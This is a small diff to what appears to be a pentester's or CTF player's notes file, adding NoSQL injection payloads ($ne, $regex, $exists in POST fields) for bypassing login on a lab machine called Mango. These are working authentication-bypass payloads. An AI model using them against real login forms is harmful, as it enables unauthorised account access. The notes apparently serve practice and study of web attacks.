@@ -57,4 +57,13 @@ dump mysql database data without using mysql client tool
 mysqldump -u root -p database_name > database_name.sql
 ```
 
+Used in ```Mango```
 
+[nosql-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md): basic authentication bypass
+
+```
+# change post data
+username[$ne]=toto&password[$ne]=toto
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+```
